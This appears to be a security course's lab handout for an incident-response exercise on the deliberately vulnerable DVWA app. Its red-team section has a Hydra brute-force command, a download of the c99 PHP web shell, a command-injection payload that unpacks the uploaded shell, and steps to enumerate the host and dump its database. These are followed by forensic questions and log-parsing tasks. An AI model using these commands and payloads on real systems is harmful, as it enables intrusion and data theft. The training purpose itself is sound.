# Week 1 - Dam Vulnerable Web App(DVWA)
This week we are using DVWA for our incident response demo. DVWA provides a vulnerable webapp that is ready to be hacked out of the box.

## Presentation
Intro to IR: https://docs.google.com/presentation/d/1URpDkIjIGJbsgWn-Dqu-diC3PAdERRVYj4I2FfBWvqk/edit?usp=sharing

## Setup demo
### Init
0. Install docker and docker-compose

### Spin up demo
0. docker-compose up -d

### WebGUI setup
0. Browse to `http://dvwa.hackinglab.beer:8080` 
0. Login
    1. username: admin
    1. password: password
0. Select "DVWA security" on the left
0. Set the security level to "low"
0. Continue to red teaming section

## Perform red teaming
### Nikto scanner
0. Spin up Kali Linux VM
0. Open terminal
0. `nikto -host http://dvwa.hackinglab.beer`

### Hydra brute force
0. `hydra -l admin -P /usr/share/dirb/wordlists/small.txt dvwa.hackinglab.beer -s 8080 http-post-form "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed" -V`

### Zip, upload and unzip c99.php
0. `wget https://raw.githubusercontent.com/tennc/webshell/master/php/PHPshell/c99/c99.php`
0. `gzip -f c99.php`
0. Browse http://dvwa.hackinglab.beer with CHROME and login
    1. User: admin
    1. Pass: password
0. Select "Upload" on the left
0. Select "Choose file", "c99.php.gz" then "Upload"
0. Select "Command injection" on the right
0. Enter `8.8.8.8; /bin/gunzip -v ../../hackable/uploads/c99.php` into "Enter ip address"
0. Browse to http://dvwa.hackinglab.beer:8080/hackable/uploads/c99.php

### Host situation awareness
0. Get current user: whoami
0. Get ip info: ip a
0. Get hostname: hostname
0. Get list of users: cat /etc/passwd
0. Get connection info: ss -l -n -t
0. Get process list: ps aux
0. Get known hosts: arp -a

### Dump database
0. `mysql -u root -e "show databases;"`
    1. There is no root password
0. `mysql -u root -e "use dvwa; show tables"`
0. `mysqldump -u root --database dvwa > dump.sql`
0. Use c99.php web shell to download dump

## Incident reponse demo
### Connecting to machine
0. ssh guardian@dvwa.hackinglab.beer -p5000

### Understanding the machine
It is important to understand the machine you are investigating

0. What is the operating system(OS) of the attacked machine?
0. What is the kernel of the attacked machine?
0. What is the timezone of the attacked machine?
0. What is the IP address of the attacked machine?
0. What is the MAC address of the attacked machine?
0. What is the hostname of the attacked machine?
0. What network services are listening on the attcked machine? -- include ports
0. What users are on the attacked machine?

### Become the cyber detective
0. What are the version numbers of all the listening services?
0. Do the services have any known vulnerabilities? What sources/tools did you use?
0. Where are the web server logs located?
0. What is the diff between the error.log and access.log? What information do these logs provide?
0. What are the user permissions of the log files? Why does this matter?
0. What is the timezone and time format of the webservers logs? Why does this matter?
0. What is the hackers's IP address?
0. What is the hacker's user-agent?
0. What is the operating system(OS) of the hacker's machine?
0. What webshell did the attacker use? 
0. Where was that webshell uploaded to?
0. What commands/actions did the attacker use?
0. Give a brief description how the attacker stole the data?
0. Lookup three mitigations for next week.

## Scripting challenges
0. Create a Github account and repo called “DFIRtooklit”
    1. Choose your own repo name
    1. Repo can be private or public -- your choice - mine is private
    1. If you don’t create a repo you won't receive any points.
0. Create a script in with a programming language of your choice to do everything in the “understanding the machine” section, items listed below, and then add three of your own.
    1. Create a script(s) that will parse webserver logs for:
    1. Unique list(no duplicates) of user ip addresses
    1. Unique list(no duplicates) of URIs 
    1. Unique list(no duplicates) of CMDs run by c99
    1. Unique list(no duplicates) of CMD responses by c99
    1. OUTPUT MUST BE PRETTY

## Red team challenge
### Create red team challenge container
0. Browse to http://dvwa.hackinglab.beer:9999
0. Select "Login"
    1. Username: admin
    1. Password: password
0. Login
0. Select "DVWA security" on the left
0. Set the security level to "medium"

### Create a PHP reverse shell with Metasploit
* attack: http://dvwa.hackinglab.beer:9090
* DO NOT ATTACK port 80

# Resources/Sources
* https://www.computersecuritystudent.com/SECURITY_TOOLS/DVWA/DVWAv107/lesson14/index.html